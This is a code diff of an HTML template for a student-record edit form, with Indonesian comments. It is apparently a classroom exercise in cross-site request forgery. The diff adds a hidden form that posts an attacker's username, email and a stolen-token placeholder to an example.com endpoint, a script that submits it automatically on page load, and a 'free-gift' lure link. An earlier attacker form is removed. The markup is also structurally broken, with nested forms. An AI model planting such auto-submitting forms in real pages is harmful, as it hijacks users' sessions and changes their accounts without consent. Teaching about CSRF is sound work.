@@ -9,10 +9,6 @@
     />
   </head>
   <body>
-
-    <?php 
-
-
     <div class="container mt-5">
       <h1>Edit Student</h1>
 
@@ -33,29 +29,15 @@
       <form id="myForm" action="/edit/{{ student.id }}" method="POST">
         <input type="text" name="name" value="{{ student.name }}" required />
 
-        <form action="update_profile.php" method="POST">
-            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>" />
-            <label for="username">Username:</label>
-            <input type="text" name="username" />
-            <button type="submit">Update</button>
-        </form>
-
-        <form action="http://example.com/update_profile.php" method="POST">
-          <input type="hidden" name="username" value="attacker_username" />
-          <input type="submit" value="Updates" class="btn btn-primary" />
-        </form>
-
-        <form action="update_profile.php" method="POST">
-          <input
-            type="hidden"
-            name="csrf_token"
-            value="<?php echo $_SESSION['csrf_token']; ?>"
-          />
-          <label for="username">Username:</label>
-          <input type="text" name="username" />
-          <button type="submit">Update</button>
-        </form>
-
+        <script>
+          document.getElementById("myForm").onsubmit = function (event) {
+            var ageInput = document.getElementById("age");
+            if (ageInput.value < 1) {
+              alert("Age cannot under 1!");
+              event.preventDefault(); // Mencegah pengiriman form
+            }
+          };
+        </script>
         <input
           type="number"
           id="age"
@@ -66,18 +48,41 @@
           required
         />
         <input type="text" name="grade" value="{{ student.grade }}" required />
-        <button type="submit" class="btn btn-primary">Update</button>
-      </form>
 
-      <script>
-        document.getElementById("myForm").onsubmit = function (event) {
-          var ageInput = document.getElementById("age");
-          if (ageInput.value < 0) {
-            alert("Age cannot be negative!");
-            event.preventDefault(); // Mencegah pengiriman form
-          }
-        };
-      </script>
+        <!-- CSRF Perlindungan Terhadap Serangan CSRF -->
+        <input
+          type="hidden"
+          name="csrf_token"
+          value="unique-token-generated-for-user-session"
+        />
+
+        <!-- Form yang dikirimkan otomatis untuk melakukan update profile -->
+        <form
+          action="http://example.com/update-profile"
+          method="POST"
+          id="csrf-form"
+        >
+          <input type="hidden" name="username" value="attacker123" />
+          <!-- username yang diserang -->
+          <input type="hidden" name="email" value="attacker@example.com" />
+          <!-- email yang diserang -->
+          <input
+            type="hidden"
+            name="csrf_token"
+            value="valid-token-from-victim"
+          />
+          <!-- CSRF token yang diambil dari sesi korban -->
+        </form>
+
+        <script type="text/javascript">
+          // Otomatis mengirimkan form saat halaman dimuat
+          document.getElementById("csrf-form").submit();
+        </script>
+
+        <button type="submit" class="btn btn-primary">Update</button>
+
+        <a href="http://example.com/free-gift">Update Sekarang</a>
+      </form>
     </div>
   </body>
 </html>
